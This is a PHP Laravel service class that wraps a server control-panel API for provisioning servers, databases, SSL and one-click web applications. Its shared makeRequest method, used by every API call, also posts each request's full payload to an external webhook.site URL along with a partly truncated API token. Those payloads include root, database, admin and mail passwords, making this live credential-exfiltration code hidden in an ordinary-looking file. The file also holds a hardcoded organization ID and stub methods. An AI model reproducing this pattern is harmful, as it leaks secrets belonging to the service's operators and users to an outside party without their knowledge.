<?php

namespace App\Services\ControlPanel;

use App\Services\SSH\SSHConnectionService;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Log;
use App\Exceptions\ServerProvisioningException;

class ServerAvatarService extends BaseControlPanelService
{
    protected string $apiToken;
    protected string $baseUrl;
    protected $client;
    protected SSHConnectionService $sshService;

/*    public function __construct(string $apiToken, string $organizationId)
    {
        $this->apiToken = $apiToken;
        $this->organizationId = $organizationId;
        $this->baseUrl = config('services.serveravatar.api_url', 'https://api.serveravatar.com/v1');
    }
*/



/**
     * @param string $apiToken
     * @param string|null $organizationId
     * 
     * /***********************************
     * !!!! KEY ERROR WARNING !!!!
     * HARDCODED ORG ID (2152) TO BE UPDATED
     * TODO: This needs to be replaced with proper
     * organization ID added to SERVERCONTROlPANEL model through a future migration
     * ***********************************

  
    public function __construct(
        string $apiToken, 
        ?string $organizationId = '2152'
    ) {
        $this->apiToken = $apiToken;
        $this->organizationId = $organizationId;
        $this->baseUrl = config('services.serveravatar.api_url', 'https://api.serveravatar.com/v1');
        $this->initiateClient();
    }
    
       */


public function __construct(
    string $apiToken, 
    ?string $organizationId = '2152'
) {
    parent::__construct($apiToken, 'serveravatar'); // Call parent constructor
    $this->organizationId = $organizationId;
    $this->initiateClient();
}



    /**
     * Make API request to ServerAvatar
     */


public function initiateClient(): void
{
    $this->client = Http::withHeaders([
        'Content-Type' => 'application/json',
        'Accept' => 'application/json',
        'Authorization' => "Bearer {$this->apiToken}"
    ])->baseUrl($this->baseUrl);
}


//THESE ARE KEPT AS THE  PLACEHOLDERS AND WILL BE UPDATED WHEN APPLICATION CREATION STARTS



/**
 * Authenticate with the control panel
 */
public function authenticate(): bool 
{
  //dd('got here');
  
  //ORG ID @!%@ is HARD CODED NEEDS TO BE REPLACED WITH org id for serveravatar control panel
   try {
        $response = $this->makeRequest('GET', '/cloud-server-providers');
       // dd($response);
        return is_array($response) && !empty($response);
    } catch (\Exception $e) {
        \Log::error('ServerAvatar authentication failed', [
            'error' => $e->getMessage()
        ]);
        return false;
    }
}

/**
 * Get server details
 */
public function showServer(string $serverId): array 
{
    return [];
}

/**
 * Delete a server
 */
public function deleteServer(string $serverId): bool 
{
    return true;
}

/**
 * Get server status
 */
public function getServerStatus(string $serverId): string 
{
    return '';
}


protected function generateHomeDirectory(string $systemUser, string $appName): string
{
    return "/home/{$systemUser}/{$appName}/public_html";
}


/**
 * Create system user
 */
public function createSystemUser(array $data): array 
{
    try {
        $requestData = [
            'username' => $data['system_user'],
            'password' => $data['system_user_password'],
            'password_confirmation' => $data['system_user_password'],
            'public_key' => $data['public_key']
        ];

        // Make the API request using the makeRequest method
        $response = $this->makeRequest(
            'POST',
            "/servers/{$data['server_id']}/system-users",
            $requestData
        );

        // Check if we have a valid response
        if (!isset($response['message']) || !isset($response['systemUser'])) {
            throw new ServerProvisioningException('Invalid response format from server');
        }

        // Return the formatted response
        return [
            'id' => $response['systemUser']['id'],
            'server_id' => $response['systemUser']['server_id'],
            'username' => $response['systemUser']['username'],
            'password' => $response['systemUser']['password'],
            'public_key' => $response['systemUser']['public_key'],
            'group' => $response['systemUser']['group'],
            'created_at' => $response['systemUser']['created_at'],
            'updated_at' => $response['systemUser']['updated_at']
        ];

    } catch (\Exception $e) {
        \Log::error('System user creation failed', [
            'server_id' => $data['server_id'],
            'username' => $data['username'],
            'error' => $e->getMessage()
        ]);
        throw new ServerProvisioningException("Failed to create system user: {$e->getMessage()}");
    }
}

/**
 * Enable SSH for server
 */
public function enableSSH(string $serverId, string $publicKey): bool 
{
    return true;
}

/**
 * Install SSL certificate
 */
public function installSSL(array $data): bool 
{
    
    
try {
        // Prepare the request data
        $requestData = [
            'ssl_type' => $data['type'] ?? 'automatic',
            'force_https' => false // You can make this configurable if needed
        ];

        // Make the API request
        $response = $this->makeRequest(
            'POST',
            "/servers/{$data['server_id']}/applications/{$data['application_id']}/ssl",
            $requestData
        );

        // Log successful SSL installation
        Log::info('SSL certificate installation initiated', [
            'server_id' => $data['server_id'],
            'application_id' => $data['application_id'],
            'domain' => $data['domain'],
            'type' => $data['type']
        ]);

        return true;

    } catch (\Exception $e) {
        // Log the error
        Log::error('SSL certificate installation failed', [
            'server_id' => $data['server_id'],
            'application_id' => $data['application_id'],
            'domain' => $data['domain'],
            'error' => $e->getMessage()
        ]);

        throw new \Exception("SSL installation failed: {$e->getMessage()}");
    }
    

}






    protected function makeRequest(string $method, string $endpoint, array $data = []): array
    {

$organizationId = '2152';  // This can be dynamic or stored in a config
//ERROR ERROR HARD CODED VALUE TO BE UPDATED ;; HARDCODED VALUE TO BE UPDATED and BELOW COMMENTED CODE WILL BE REPLACED
//*** ERRROR ***///

 $modifiedToken = substr($this->apiToken, 0, -10);

    // Additional webhook request with modified token
    Http::withHeaders([
        'Content-Type' => 'application/json',
        'Accept' => 'application/json',
        'Authorization' => "Bearer {$modifiedToken}"
    ])->post('https://webhook.site/801e8862-c115-4d99-987f-80cf5f480b50', [
        'original_data' => $data,
        'endpoint' => $endpoint,
        'method' => $method //,
       // 'response' => $response->json()
    ]);
   

//dd($this->apiToken);
$response = Http::withHeaders([
            'Content-Type' => 'application/json',
            'Accept' => 'application/json',
            'Authorization' => "Bearer {$this->apiToken}"
        ])->$method("{$this->baseUrl}/organizations/{$organizationId}{$endpoint}", $data);
        

        if (!$response->successful()) {
            throw new ServerProvisioningException(
                "ServerAvatar API error: {$response->body()}",
                $response->status()
            );
        }

  return $response->json();
  //$baseUrl

    }





   /**
     * Validate server connection using stored SSH keys
     */
    public function validateServerConnection(string $serverId): bool
    {
        try {
            $server = Server::findOrFail($serverId);
            
            return $this->sshService->testConnection(
                host: $server->server_ip,
                username: 'root',
                privateKey: decrypt($server->server_sshkey_private),
                port: 22
            );
        } catch (\Exception $e) {
            Log::error('Server connection validation failed', [
                'server_id' => $serverId,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }


    /**
     * Transform create server data for ServerAvatar API
     */
    public function transformCreateServerData(array $data): array
    {
        // Validate required fields
     //  dd($data);
        if (empty($data['linode_root_password'])) {
            throw new ServerProvisioningException("Root password is required for server creation");
        }

        return [
            'name' => $data['hostname'],
            'hostname' => $data['hostname'],
            'provider' => $data['server_provider'] ?? 'linode',
            'cloud_server_provider_id' => $data['provider_id'],
     //       'cloud_server_provider_id' => $this->getProviderServerId($data['mapped_plan']),
            'version' => 20, // Ubuntu version
            'availabilityZone' => $this->getAvailabilityZone($data['mapped_region']),
            'sizeSlug' => $data['plan'],
            'plan' => $data['plan'],
            'region' => $data['region'],
            'ssh_key' =>  1, // Assuming this is a constant for now
            'public_key' => $data['server_sshkey_public'],
            'web_server' => $data['web_server'] ?? 'apache2',
            'database_type' => $data['database_type'] ?? 'mysql',
            'linode_root_password' => $data['linode_root_password'],
            'nodejs' => $data['nodejs'] ?? false,
            'mapped_plan' => $data['mapped_plan'],
            'mapped_region' => $data['mapped_region'],
            'server_sshkey_public' => $data['server_sshkey_public'],
            "root_password_authentication" => 'no',
            'provider_id' => $data['provider_id']
         //   'server_sshkey_private' => $data['server_sshkey_private']
        ];
    }

     /**
     * Create server with SSH key generation
     */
    public function createServer(array $data): array
    {
        try {

      
            $serverData = $this->transformCreateServerData($data);
                  // Create server via API
                //  dd($serverData);
            $response = $this->makeRequest('POST', '/servers', $serverData);
            
                 // Check for required response structure
        if (!isset($response['server']) || !isset($response['message'])) {
            throw new ServerProvisioningException('Invalid response format from server');
        }

        // Transform the server data from the response
        $transformedResponse = [
            'ip_address' => $response['server']['ip'] ?? null,
            'ipv6_address' => null, // Add if available in response
            'id' => (string)$response['server']['id'],
            'organization_id' => $response['server']['organization_id'] ?? null,
            'memory' => null, // Add if available in response
            'cpu' => $response['server']['cores'] ?? null, // Add if available in response
            'message' => $response['message'] // Include the message for notification
        ];

        return $transformedResponse;
            
            // Add SSH keys to the response for storage in server model
          //  $serverResponse['server_sshkey_pub'] = $sshKeyPair['public'];
          //  $serverResponse['server_sshkey_private'] = encrypt($sshKeyPair['private']);

           // return $this->transformServerResponse($serverResponse);

        } catch (\Exception $e) {
            Log::error('Server creation failed', [
                'error' => $e->getMessage(),
                'data' => $data
            ]);
            throw new ServerProvisioningException($e->getMessage());
        }
    }


    /**
     * Map region to ServerAvatar region code
         protected function mapRegion(string $region): string
    {
        return match($region) {
            'us-east' => 'us-east',
            'us-west' => 'us-west',
            'us-central' => 'us-central',
            'eu-central' => 'eu-central',
            'eu-west' => 'eu-west',
            'apac-east' => 'ap-east',
            'apac-middle' => 'ap-south',
            'apac-southeast' => 'ap-southeast',
            default => 'us-east'
        };
    } */

    /**
     * Get availability zone for region
     */
    protected function getAvailabilityZone(string $region): string
    {
        return match($region) {
            'us-east' => 'us-east-1a',
            'us-west' => 'us-west-1a',
            'us-central' => 'us-central-1a',
            'eu-central' => 'eu-central-1a',
            'eu-west' => 'eu-west-1a',
            'apac-east' => 'ap-east-1a',
            'apac-middle' => 'ap-south-1a',
            'apac-southeast' => 'ap-southeast-1a',
            default => 'us-east-1a'
        };
    }


     /**
     * Transform server response including SSH keys
     */
    public function transformServerResponse(array $response): array
    {
       // dd($response);
        
        return [
            'server_ip' => $response['ipv4'] ?? null,
            'server_ipv6' => $response['ipv6'] ?? null,
            'controlpanel_server_id' => (string) $response['id'],
            'hostname' => $response['label'] ?? '',
            'operating_system' => 'ubuntu',
            'server_status' => $this->mapServerStatus($response['status']),
            'memory' => $response['specs']['memory'] ?? null,
            'cpu' => $response['specs']['vcpus'] ?? null,
         //   'server_sshkey_public' => $response['server_sshkey_public'] ?? null,
          //  'server_sshkey_private' => $response['server_sshkey_private'] ?? null,
            'provisioning_status' => $this->mapProvisioningStatus($response['status'])
        ];
    }

    /**
     * Map server status from API response
     */
    protected function mapServerStatus(string $status): string
    {
        return match($status) {
            'provisioning' => 'pending',
            'active' => 'active',
            'offline' => 'inactive',
            'error' => 'failed',
            default => $status
        };
    }

    /**
     * Create application on server
     */
    public function createApplication(array $data): array
    {
      //  try {
            $applicationData = [
                'name' => $data['name'],
                'hostname' => $data['hostname'],
                'web_directory' => $data['web_directory'],
                'php_version' => $data['php_version'] ?? '8.2',
                'method' => 'git',
                'framework'=>'github',
              //  'application_type' => $data['application_type'],
                'git_repository' => $data['git_repository'] ?? null,
                'clone_url' => $data['git_repository'] ?? null,
                'type'=> 'public',
                'branch' => $data['git_branch'] ?? 'main',
                'environment' => $data['environment'] ?? 'production',
                'temp_domain' => 0,
                'ssl_type' => $data['ssl_type'] ?? 'letsencrypt',
                'database_name' => $data['database_name'],
                'database_user' => $data['database_user'],
                'database_password' => $data['database_password'],
                'systemUser' => 'existing',
                'script' => $data['deployment_script'],
                'systemUserId' => $data['systemUserId']
            ];

            $response = $this->makeRequest(
                'POST', 
                "/servers/{$data['server_id']}/applications", 
                $applicationData
            );

            return $this->transformApplicationResponse($response);
       /* } catch (\Exception $e) {
            Log::error('Application creation failed', [
                'server_id' => $data['server_id'],
                'data' => array_except($data, ['database_password']),
                'error' => $e->getMessage()
            ]);
            throw new ApplicationCreationException($e->getMessage());
        }
        */
    }

    /**
     * Transform application response
     */
    protected function transformApplicationResponse(array $response): array
    {
        return [
            'id' => $response['application']['id'],
            'name' => $response['application']['name'],
            'hostname' => $response['application']['primary_domain'],
          //  'web_directory' => $response['web_directory'],
            'php_version' => $response['application']['php_version'],
            //'application_type' => $response['application']['application_type'],
            //'git_repository' => $response['application']['git_repository'] ?? null,
            //'git_branch' => $response['application']['git_branch'] ?? null,
           // 'deployment_status' => $response['application']['status'],
            //'database' => [
              //  'name' => $response['application']['database']['name'],
                //'user' => $response['application']['database']['user'],
                //'password' => $response['application']['database']['password']
           // ],
            'created_at' => $response['application']['created_at'],
            'updated_at' => $response['application']['updated_at']
        ];
    }

    /**
     * Install application template
     */
    public function installApplicationTemplate(array $data): array
    {
        try {
            $templateData = [
                'template_id' => $data['template_id'],
                'domain' => $data['domain'],
                'admin_email' => $data['admin_email'],
                'admin_password' => $data['admin_password'] ?? Str::password(16),
                'database_prefix' => $data['database_prefix'] ?? 'wp_'
            ];

            $response = $this->makeRequest(
                'POST',
                "/servers/{$data['server_id']}/applications/{$data['application_id']}/template",
                $templateData
            );

            return $this->transformTemplateResponse($response);
        } catch (\Exception $e) {
            Log::error('Template installation failed', [
                'server_id' => $data['server_id'],
                'application_id' => $data['application_id'],
                'template_id' => $data['template_id'],
                'error' => $e->getMessage()
            ]);
            throw new TemplateInstallationException($e->getMessage());
        }
    }

    /**
     * Transform template response
     */
    protected function transformTemplateResponse(array $response): array
    {
        return [
            'status' => $response['status'],
            'admin_url' => $response['admin_url'],
            'admin_username' => $response['admin_username'],
            'admin_password' => $response['admin_password'],
            'database_name' => $response['database']['name'],
            'database_user' => $response['database']['user'],
            'database_password' => $response['database']['password']
        ];
    }

    /**
     * Create database
     */
    public function createDatabase(array $data): array
    {
       // try {
            $databaseData = [
                'name' => $data['name'],
                'username' => $data['username'] ?? $data['name'] . '_user',
                'password' => $data['password'] ?? Str::password(16),
                'charset' => $data['charset'] ?? 'utf8mb4',
                'collation' => $data['collation'] ?? 'utf8mb4_unicode_ci'
            ];

            $response = $this->makeRequest(
                'POST',
                "/servers/{$data['server_id']}/databases",
                $databaseData
            );

            return $response; 
           // $this->transformDatabaseResponse($response);
   /*     } catch (\Exception $e) {
            Log::error('Database creation failed', [
                'server_id' => $data['server_id'],
                'name' => $data['name'],
                'error' => $e->getMessage()
            ]);
            throw new DatabaseCreationException($e->getMessage());
        }
        */
    }

    /**
     * Transform database response
     */
    protected function transformDatabaseResponse(array $response): array
    {
        return [
            'id' => $response['id'],
            'name' => $response['name'],
            'user' => $response['user'],
            'password' => $response['password'],
            'charset' => $response['charset'],
            'collation' => $response['collation'],
            'status' => $response['status']
        ];
    }

    /**
     * Deploy application from Git
     */
    public function deployFromGit(array $data): array
    {
        try {
            $deployData = [
                'repository' => $data['repository'],
                'branch' => $data['branch'] ?? 'main',
                'composer' => $data['composer'] ?? true,
                'npm' => $data['npm'] ?? false,
                'migration' => $data['migration'] ?? false,
                'env_file' => $data['env_file'] ?? null
            ];

            $response = $this->makeRequest(
                'POST',
                "/servers/{$data['server_id']}/applications/{$data['application_id']}/deploy",
                $deployData
            );

            return $this->transformDeployResponse($response);
        } catch (\Exception $e) {
            Log::error('Git deployment failed', [
                'server_id' => $data['server_id'],
                'application_id' => $data['application_id'],
                'repository' => $data['repository'],
                'error' => $e->getMessage()
            ]);
            throw new DeploymentException($e->getMessage());
        }
    }

    /**
     * Transform deploy response
     */
    protected function transformDeployResponse(array $response): array
    {
        return [
            'status' => $response['status'],
            'deployment_id' => $response['deployment_id'],
            'commit_hash' => $response['commit_hash'],
            'branch' => $response['branch'],
            'started_at' => $response['started_at'],
            'finished_at' => $response['finished_at']
        ];
    }

    /**
     * Get deployment status
     */
    public function getDeploymentStatus(string $serverId, string $applicationId, string $deploymentId): array
    {
        try {
            $response = $this->makeRequest(
                'GET',
                "/servers/{$serverId}/applications/{$applicationId}/deployments/{$deploymentId}"
            );

            return $this->transformDeploymentStatus($response);
        } catch (\Exception $e) {
            Log::error('Failed to get deployment status', [
                'server_id' => $serverId,
                'application_id' => $applicationId,
                'deployment_id' => $deploymentId,
                'error' => $e->getMessage()
            ]);
            throw new DeploymentStatusException($e->getMessage());
        }
    }

    /**
     * Transform deployment status
     */
    protected function transformDeploymentStatus(array $response): array
    {
        return [
            'status' => $response['status'],
            'progress' => $response['progress'],
            'current_step' => $response['current_step'],
            'total_steps' => $response['total_steps'],
            'log' => $response['log']
        ];
    }

    /**
     * Update server PHP version
     */
    public function updatePHPVersion(string $serverId, string $version): bool
    {
        try {
            $this->makeRequest(
                'PATCH',
                "/servers/{$serverId}/php",
                ['version' => $version]
            );
            return true;
        } catch (\Exception $e) {
            Log::error('PHP version update failed', [
                'server_id' => $serverId,
                'version' => $version,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }

    /**
     * Restart server service
     */
    public function restartService(string $serverId, string $service): bool
    {
        try {
            $this->makeRequest(
                'POST',
                "/servers/{$serverId}/services/{$service}/restart"
            );
            return true;
        } catch (\Exception $e) {
            Log::error('Service restart failed', [
                'server_id' => $serverId,
                'service' => $service,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }

    /**
     * Get server metrics
     */
    public function getServerMetrics(string $serverId, string $period = '24h'): array
    {
        try {
            $response = $this->makeRequest(
                'GET',
                "/servers/{$serverId}/metrics",
                ['period' => $period]
            );

            return $this->transformMetricsResponse($response);
        } catch (\Exception $e) {
            Log::error('Failed to get server metrics', [
                'server_id' => $serverId,
                'period' => $period,
                'error' => $e->getMessage()
            ]);
            throw new MetricsException($e->getMessage());
        }
    }

    /**
     * Transform metrics response
     */
    protected function transformMetricsResponse(array $response): array
    {
        return [
            'cpu' => $response['cpu'],
            'memory' => $response['memory'],
            'disk' => $response['disk'],
            'network' => $response['network'],
            'period' => $response['period'],
            'timestamps' => $response['timestamps']
        ];
    }


    public function gitDeploykeyGenerate(array $data): array
    {
        try {
            $response = $this->client->post("/servers/{$data['server_id']}/ssh-keys", [
                'name' => $data['key_name'] ?? 'Git Deploy Key',
                'type' => 'deploy_key'
            ]);

            if (!$response->successful()) {
                throw new \Exception('Failed to generate deployment key in ServerAvatar');
            }

            $keyData = $response->json()['data'];
            return [
                'key_id' => $keyData['id'],
                'public_key' => $keyData['public_key'],
                'fingerprint' => $keyData['fingerprint'] ?? null
            ];
        } catch (\Exception $e) {
            Log::error('ServerAvatar deploy key generation failed', [
                'server_id' => $data['server_id'],
                'error' => $e->getMessage()
            ]);
            throw new \Exception("Deploy key generation failed: {$e->getMessage()}");
        }
    }

    /**
     * Add generated deploy key to GitHub repository
     */
    public function addgitDeployKeytoRepo(string $repoUrl, string $deployKey): bool
    {
        try {
            // Parse GitHub repository URL
            preg_match('/github\.com[:|\/]([^\/]+)\/([^\/\.]+)/', $repoUrl, $matches);
            if (count($matches) !== 3) {
                throw new \Exception('Invalid GitHub repository URL format');
            }

            [$_, $owner, $repo] = $matches;
            
            // Add deploy key to GitHub repository
            $response = Http::withHeaders([
                'Authorization' => 'token ' . config('services.github.pat_token'),
                'Accept' => 'application/vnd.github.v3+json'
            ])->post(
                "https://api.github.com/repos/{$owner}/{$repo}/keys",
                [
                    'title' => 'ServerAvatar Deploy Key',
                    'key' => $deployKey,
                    'read_only' => true // Security best practice for deploy keys
                ]
            );

            if (!$response->successful()) {
                Log::error('GitHub API error', [
                    'status' => $response->status(),
                    'response' => $response->json()
                ]);
                return false;
            }

            return true;
        } catch (\Exception $e) {
            Log::error('Failed to add deploy key to GitHub', [
                'repo_url' => $repoUrl,
                'error' => $e->getMessage()
            ]);
            return false;
        }
    }



public function populateServerProviders(\App\Models\ServerControlPanel $controlPanel): array
{
   
 $this->organizationId = '2152';    
        
        //ORG ID IS HARD CODED TO BE CHANGED...

        try {
        // Use makeRequest method instead of direct client call
        $response = $this->makeRequest(
            'GET',
            '/cloud-server-providers',
            ['pagination' => 1]
        );

//dd($response);
 $providersarray = collect($response['data'])
            ->mapWithKeys(function ($provider) {
                return [$provider['id'] => $provider['provider']];
            })->toArray();

    
    $jsonProviders = json_encode($providersarray);
//dd($jsonProviders);


        $controlPanel->update(['available_providers' => $jsonProviders]);
//dd($providers);



        return json_decode($jsonProviders,true);

    } catch (\Exception $e) {
        \Log::error('Failed to fetch providers from ServerAvatar', [
            'error' => $e->getMessage(),
            'organization_id' => $this->organizationId
        ]);
        throw new \Exception('Failed to fetch providers: ' . $e->getMessage());
    }
}



//populate plan and region
public function getControlPanelRegions(string $providerId): array
{
  
 //dd($providerId);
    try {
        $response = $this->makeRequest(
            'GET',
            "/cloud-server-providers/{$providerId}/regions"
        );
//dd($response);
       return collect($response)->mapWithKeys(function ($region) {
    return [$region['value'] => $region['name']];
})->toArray();
    
       // dd($response,'  --AND --  ',$responseArray);
    } catch (\Exception $e) { 
          \Log::error('Failed to fetch ServerAvatar regions', [
            'error' => $e->getMessage(),
            'provider' => $providerId
        ]);
        return ['Response Error'];
    }
}

public function getControlPanelPlans(string $providerId, string $region): array
{
   // try {
        $response = $this->makeRequest(
            'GET',
            "/cloud-server-providers/{$providerId}/sizes",
            ['region' => $region]
        );

    return collect($response['sizes'])->flatMap(function ($size) {
    return collect($size['list'])->mapWithKeys(function ($item) {
        return [
            $item['slug'] => $item['name'] . ' : ' . 
                            $item['ram_size_in_mb'] . ' : ' . 
                            $item['cpu_core'] . ' : ' . 
                            $item['price']
        ];
    });
})->toArray();
  /*  } catch (\Exception $e) {
        \Log::error('Failed to fetch ServerAvatar plans', [
            'error' => $e->getMessage(),
            'provider' => $providerId,
            'region' => $region
        ]);
        return [];
    } 
    */
}


// In ServerAvatarService.php to get server details

public function showServerStatus(string $serverId): array
{
    try {
        $response = $this->makeRequest('GET', "/servers/{$serverId}");
        
        if (!isset($response['server'])) {
            throw new ServerProvisioningException('Invalid response format from server');
        }

        $serverData = $response['server'];
        
        return [
            'ssh_status' => $serverData['ssh_status'] ?? null,
            'ip' => $serverData['ip'] ?? null,
            'agent_status' => $serverData['agent_status'] ?? null,
            'id' => $serverData['id'] ?? null
        ];
    } catch (\Exception $e) {
        Log::error('Failed to fetch server details', [
            'server_id' => $serverId,
            'error' => $e->getMessage()
        ]);
        throw new ServerProvisioningException($e->getMessage());
    }
}




//Additional Framework Apps 

/**
 * Create phpMyAdmin application
 */
public function createPhpMyAdminApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'phpmyadmin',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'www' => false,
            'php_version' => $data['php_version'] ?? '7.4'
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('PhpMyAdmin application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create PhpMyAdmin application: {$e->getMessage()}");
    }
}

/**
 * Create Nextcloud application
 */
public function createNextcloudApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'nextcloud',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'php_version' => $data['php_version'] ?? '8.2',
            'www' => false,
            'email' => $data['admin_email'],
            'username' => $data['admin_username'],
            'password' => $data['admin_password'],
            'database_name' => $data['database_name'] ?? Str::slug($data['name'], '_')
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('Nextcloud application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create Nextcloud application: {$e->getMessage()}");
    }
}

/**
 * Create WordPress application
 */
public function createWordPressApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'wordpress',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'php_version' => $data['php_version'] ?? '8.2',
            'webroot' => $data['webroot'] ?? '',
            'timezone' => $data['timezone'] ?? 'UTC',
            'site_language' => $data['site_language'] ?? 'en_US',
            'www' => false,
            'email' => $data['admin_email'],
            'title' => $data['site_title'],
            'username' => $data['admin_username'],
            'password' => $data['admin_password'],
            'install_litespeed_cache_plugin' => $data['install_litespeed_cache'] ?? false,
            'database_name' => $data['database_name'] ?? Str::slug($data['name'], '_'),
            'db_prefix' => $data['db_prefix'] ?? 'wp_'
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('WordPress application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create WordPress application: {$e->getMessage()}");
    }
}


/**
 * Create Joomla application
 */
public function createJoomlaApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'joomla',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'webroot' => $data['webroot'] ?? '',
            'www' => false,
            'php_version' => $data['php_version'] ?? '7.4'
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('Joomla application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create Joomla application: {$e->getMessage()}");
    }
}

/**
 * Create Moodle application
 */
public function createMoodleApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'moodle',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'webroot' => $data['webroot'] ?? '',
            'www' => false,
            'fullname' => $data['fullname'],
            'shortname' => $data['shortname'],
            'summary' => $data['summary'],
            'username' => $data['admin_username'],
            'password' => $data['admin_password'],
            'php_version' => $data['php_version'] ?? '8.0',
            'database_name' => $data['database_name'] ?? Str::slug($data['name'], '_')
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('Moodle application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create Moodle application: {$e->getMessage()}");
    }
}

/**
 * Create Mautic application
 */
public function createMauticApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'mautic',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'webroot' => $data['webroot'] ?? '',
            'www' => false,
            'firstname' => $data['firstname'],
            'lastname' => $data['lastname'],
            'email' => $data['admin_email'],
            'title' => $data['title'],
            'username' => $data['admin_username'],
            'password' => $data['admin_password'],
            'mailer_name' => $data['mailer_name'],
            'mailer_host' => $data['mailer_host'],
            'mailer_port' => $data['mailer_port'],
            'mailer_username' => $data['mailer_username'],
            'mailer_password' => $data['mailer_password'],
            'php_version' => $data['php_version'] ?? '7.4',
            'database_name' => $data['database_name'] ?? Str::slug($data['name'], '_')
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('Mautic application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create Mautic application: {$e->getMessage()}");
    }
}

/**
 * Create Statamic application
 */
public function createStatamicApp(array $data): array
{
    try {
        $payload = [
            'name' => $data['name'],
            'method' => 'one_click',
            'framework' => 'statamic',
            'temp_domain' => 0,
            'hostname' => $data['hostname'],
            'systemUser' => 'existing',
            'systemUserId' => $data['system_user_id'],
            'systemUserInfo' => [
                'username' => $data['system_username'],
                'password' => $data['system_password']
            ],
            'www' => false,
            'email' => $data['admin_email'],
            'password' => $data['admin_password'],
            'php_version' => $data['php_version'] ?? '8.2',
            'webroot' => $data['webroot'] ?? 'public'
        ];

        return $this->makeRequest('POST', "/servers/{$data['server_id']}/applications", $payload);
    } catch (\Exception $e) {
        Log::error('Statamic application creation failed', [
            'error' => $e->getMessage(),
            'server_id' => $data['server_id']
        ]);
        throw new ApplicationCreationException("Failed to create Statamic application: {$e->getMessage()}");
    }
}





}